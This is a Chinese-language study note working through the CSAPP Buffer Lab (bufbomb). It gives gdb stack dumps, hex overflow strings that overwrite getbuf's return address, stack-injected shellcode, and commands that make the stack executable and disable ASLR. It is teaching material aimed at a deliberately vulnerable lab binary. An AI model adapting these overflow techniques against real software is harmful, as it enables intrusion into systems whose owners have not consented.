---

类型: 笔记
创建日期: 2024-05-23
修改日期: 2024-05-23
---
## level 0 Candle
`(gdb) p/x &smoke`
`$1 = 0x8048e20`

单步调试机器指令 `stepi` `si`
```
Breakpoint 2, 0x08048ff1 in getbuf ()

(gdb)  info registers esp
esp            0xffffb070          0xffffb070
(gdb)  info registers ebp
ebp            0xffffb088          0xffffb088

(gdb) x/16xw $esp
0xffffb070:     0xffffb07c      0xf7ef8550      0x00000000      0x65646f77
0xffffb080:     0x0000616d      0x0804b5c0      0xffffb0a8    **0x0804901e**

(gdb) x/1xw $ebp
0xffffb0a8 
```
0x0804901e就是test中调用get_buf的下一条指令地址，要将其改为我们要的smoke地址0x8048e20，小端存储低地址在前。
我一直在想的是要保存好旧的ebp的那块区域，不然ebp无法正确返回到上一个栈。
想错了，ebp，esp中存放的是地址值，而我会覆盖的是地址值里的内容。
栈的扩张和收缩都是由ebp，esp（寄存器）传递自己内部保存的地址值整的，~~期间是不会去访问地址值内的内容的~~。（是会访问的，leave时要将旧ebp值弹回ebp，所以ebp里的值会出问题。
> leave：使栈做好返回准备，等价于
	mov %ebp，%esp
	pop %ebp

但是ret指令会把返回地址弹回esp，如果把此栈帧空间全部覆盖了，程序跳转是没问题的。**而且去下一个函数中执行时上来先push ebp，其实不会有影响**

要想覆盖掉返回地址，只需要看创建现在这个栈帧时分配了多大的空间，直接把对应得返回地址给覆盖了。


通过，构造字符串如下
`31 31 31 31 31 31 31 31 c0 b5 04 08 a8 b0 ff ff 1e 90 04 08`

```

Breakpoint 2, 0x08048fe6 in getbuf ()
(gdb) x/16xw $ebp-0xc
0xffffb07c:     0x00000000      0x00000004      0x0804b5c0      0xffffb0a8
0xffffb08c:     0x0804901e      0x00000003      0x08049ac7      0xffffb0b4
0xffffb09c:     0x00000000      0xffffb0c0      0xdeadbeef      0xffffc888
0xffffb0ac:     0x08049105      0x08049ac7      0x000000f4      0x00001770
(gdb) c
Continuing.

Breakpoint 1, 0x08048ff1 in getbuf ()
(gdb) x/16xw $ebp-0xc
0xffffb07c:     0x04030201      0x08070605      0x12111009      0xffffb0a8
0xffffb08c:     0x08048e20      0x00000000      0x08049ac7      0xffffb0b4
0xffffb09c:     0x00000000      0xffffb0c0      0xdeadbeef      0xffffc888
0xffffb0ac:     0x08049105      0x08049ac7      0x000000f4      0x00001770
(gdb) 
```
问题：上一个函数的传参3为什么也没了
解答：经过测试发现是最后还添加一个0x00，刚好覆盖了
## level 1 Sparkler
`fizz`函数地址`08048dc0`
函数中`8048dc7:	8b 5d 08  mov 0x8(%ebp),%ebx  ; 入参int val`
要在ebp + 8 位置放好字符串，下图展示如何确定此位置
![[B6E3A24C5F56A69DF646F52EF8BC9CAA.png]]
`01 02 03 04 05 06 07 08 09 10 11 12 00 00 00 00 c0 8d 04 08 00 00 00 00 dd dd 68 57`
## Level 2 Firecracker
Bang地址`08048d60 <bang>:`
`mov    0x804a1dc,%eax                ; <global_value>`
`cmp    0x804a1cc,%eax                ; <cookie>`
首先要修改程序堆栈的可执行属性，然后关掉系统的栈地址随机化，否则每一次的缓冲区位置都不相同，无法通过缓冲区溢出跳转到此固定的缓冲区位置执行，即如下命令：
```shell
apt-get install execstack
execstack -s bufbomb
sudo sysctl -w kernel.randomize_va_space=0
```
打断点查看gets函数的传参地址
`(gdb) x $eax`
`0xffffb07c:     0x00000000`
构建栈上运行的代码：
```
movl $0x804a1cc, %eax
movl %eax, $0x804a1dc       ; 将cookie地址传给global_value
pushq $0x08048d60           ; 返回Bang运行
retq
```

转为汇编
```

bang.o：     elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   a1 cc a1 04 08          mov    0x804a1cc,%eax
   5:   a3 dc a1 04 08          mov    %eax,0x804a1dc
   a:   68 60 8d 04 08          push   $0x8048d60
   f:   c3                      ret  

```


```
joseph@LAPTOP-E1IU5B7P:~/CSAPP/bufflab$ ./bufbomb -t SA23225138 < exploit-raw.txt 
Team: SA23225138
Cookie: 0x5768dddd
Type string:Bang!: You set global_value to 0x5768dddd
sh: 1: /usr/sbin/sendmail: not found
Error: Unable to send validation information to grading server
```

## level 3 dynamic
```
a1 cc a1 04 08 68 1e 90 04 08 c3 00 a8 b0 ff ff 7c b0 ff ff
```


## 要点
![[Pasted image 20240526214127.png]]
### level 0
只需要覆盖getbuf原本的返回值
`0x08048e20`
```
01 02 03 04 05 06 07 08 09 10 11 12 00 00 00 00 20 8e 04 08
```
### level 1
覆盖getbuf的返回值，对于入参val还要将其放在对应的地方ebp+8
```
01 02 03 04 05 06 07 08 09 10 11 12 00 00 00 00 c0 8d 04 08 00 00 00 00 b2 cb 1e 75
```
### level 2
要栈上执行指令，那么需要将返回值修改为指令序列头部，即buf首地址。
指令内容：将cookie的值放入global_value，并push函数地址，这样执行完指令后跳转
```
a1 cc a1 04 08 a3 dc a1 04 08 68 60 8d 04 08 c3 7c be ff ff
```
### level 3
```
a1 cc a1 04 08 68 1e 90 04 08 c3 00 a8 be ff ff 7c be ff ff
```
要栈上执行指令，那么需要将返回值修改为指令序列头部，即buf首地址。
指令内容：将cookie的值放入eax，并push下一条执行的地址，这样执行完指令后跳转
